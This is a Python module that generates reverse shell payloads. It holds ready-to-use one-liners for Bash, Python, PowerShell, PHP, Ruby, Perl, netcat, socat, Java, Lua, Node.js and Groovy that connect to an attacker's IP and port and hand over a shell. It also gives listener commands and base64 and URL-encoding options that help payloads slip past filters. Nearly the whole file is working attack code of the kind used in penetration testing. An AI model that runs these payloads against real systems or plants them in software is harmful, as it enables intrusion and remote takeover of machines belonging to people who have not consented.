"""Reverse shell payload definitions."""

from base64 import b64encode
from urllib.parse import quote

SHELLS = {
    "bash": {
        "name": "Bash",
        "variants": {
            "bash-i": {
                "name": "Bash -i",
                "cmd": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
            },
            "bash-196": {
                "name": "Bash 196",
                "cmd": '0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196',
            },
            "bash-udp": {
                "name": "Bash UDP",
                "cmd": 'bash -i >& /dev/udp/{ip}/{port} 0>&1',
            },
            "bash-readline": {
                "name": "Bash read line",
                "cmd": 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            },
            "bash-5": {
                "name": "Bash 5",
                "cmd": 'bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            },
        },
    },
    "python": {
        "name": "Python",
        "variants": {
            "python3-short": {
                "name": "Python3 shortest",
                "cmd": """python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'""",
            },
            "python3-1": {
                "name": "Python3 #1",
                "cmd": """export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'""",
            },
            "python3-2": {
                "name": "Python3 #2",
                "cmd": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'""",
            },
            "python2": {
                "name": "Python2",
                "cmd": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
            },
        },
    },
    "powershell": {
        "name": "PowerShell",
        "variants": {
            "powershell-1": {
                "name": "PowerShell #1",
                "cmd": """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
            },
        },
    },
    "php": {
        "name": "PHP",
        "variants": {
            "php-exec": {
                "name": "PHP exec",
                "cmd": """php -r '$sock=fsockopen("{ip}",{port});exec("bash <&3 >&3 2>&3");'""",
            },
            "php-shell-exec": {
                "name": "PHP shell_exec",
                "cmd": """php -r '$sock=fsockopen("{ip}",{port});shell_exec("bash <&3 >&3 2>&3");'""",
            },
            "php-popen": {
                "name": "PHP popen",
                "cmd": """php -r '$sock=fsockopen("{ip}",{port});popen("bash <&3 >&3 2>&3", "r");'""",
            },
        },
    },
    "ruby": {
        "name": "Ruby",
        "variants": {
            "ruby-1": {
                "name": "Ruby #1",
                "cmd": """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'""",
            },
        },
    },
    "perl": {
        "name": "Perl",
        "variants": {
            "perl-1": {
                "name": "Perl",
                "cmd": """perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");}};'""",
            },
        },
    },
    "netcat": {
        "name": "Netcat",
        "variants": {
            "nc-e": {
                "name": "nc -e",
                "cmd": "nc {ip} {port} -e /bin/bash",
            },
            "nc-c": {
                "name": "nc -c",
                "cmd": "nc -c /bin/bash {ip} {port}",
            },
            "nc-mkfifo": {
                "name": "nc mkfifo",
                "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            },
            "ncat": {
                "name": "ncat",
                "cmd": "ncat {ip} {port} -e /bin/bash",
            },
        },
    },
    "socat": {
        "name": "Socat",
        "variants": {
            "socat-1": {
                "name": "Socat #1",
                "cmd": "socat TCP:{ip}:{port} EXEC:'bash',pty,stderr,setsid,sigint,sane",
            },
        },
    },
    "java": {
        "name": "Java",
        "variants": {
            "java-runtime": {
                "name": "Java Runtime",
                "cmd": """Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();""",
            },
        },
    },
    "lua": {
        "name": "Lua",
        "variants": {
            "lua-1": {
                "name": "Lua #1",
                "cmd": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('bash -i <&3 >&3 2>&3');" """,
            },
        },
    },
    "nodejs": {
        "name": "Node.js",
        "variants": {
            "node-1": {
                "name": "Node.js #1",
                "cmd": "require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')",
            },
            "node-2": {
                "name": "Node.js #2",
                "cmd": """(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("bash", []);var client = new net.Socket();client.connect({port}, "{ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();""",
            },
        },
    },
    "groovy": {
        "name": "Groovy",
        "variants": {
            "groovy-1": {
                "name": "Groovy",
                "cmd": """String host="{ip}";
int port={port};
String cmd="/bin/bash";
Process p=cmd.execute();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();""",
            },
        },
    },
}

LISTENERS = {
    "socat": "socat file:`tty`,raw,echo=0 TCP-L:{port}",
}
DEFAULT_LISTENER = "nc -lvnp {port}"


def generate(ip: str, port: str, lang: str, variant: str | None = None,
             encoding: str = "raw") -> str:
    """Generate a reverse shell command."""
    if lang not in SHELLS:
        raise ValueError(f"Unknown language: {lang}. Use: {', '.join(SHELLS)}")

    shell = SHELLS[lang]
    variants = shell["variants"]

    if variant is None:
        variant = next(iter(variants))
    elif variant not in variants:
        available = ", ".join(variants)
        raise ValueError(f"Unknown variant: {variant}. Use: {available}")

    cmd = variants[variant]["cmd"].format(ip=ip, port=port)

    if encoding == "base64":
        cmd = b64encode(cmd.encode()).decode()
    elif encoding == "url":
        cmd = quote(cmd)
    elif encoding == "double-url":
        cmd = quote(quote(cmd))

    return cmd


def get_listener(lang: str, port: str) -> str:
    """Get the listener command for a language."""
    template = LISTENERS.get(lang, DEFAULT_LISTENER)
    return template.format(port=port)


def list_languages() -> list[dict]:
    """List all available languages and their variants."""
    result = []
    for lang_id, lang in SHELLS.items():
        variants = [{"id": v_id, "name": v["name"]} for v_id, v in lang["variants"].items()]
        result.append({"id": lang_id, "name": lang["name"], "variants": variants})
    return result
